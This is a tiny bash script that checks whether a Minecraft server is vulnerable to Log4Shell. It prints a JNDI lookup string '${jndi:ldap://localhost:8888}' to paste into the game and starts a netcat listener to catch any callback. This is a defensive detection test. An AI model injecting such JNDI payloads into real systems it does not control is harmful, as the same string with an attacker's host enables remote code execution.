#!/bin/bash

echo "Enter \${jndi:ldap://localhost:8888} in Minecraft"
echo "If nc receives any packet, it means it is vulnerable"
nc -nvl 8888

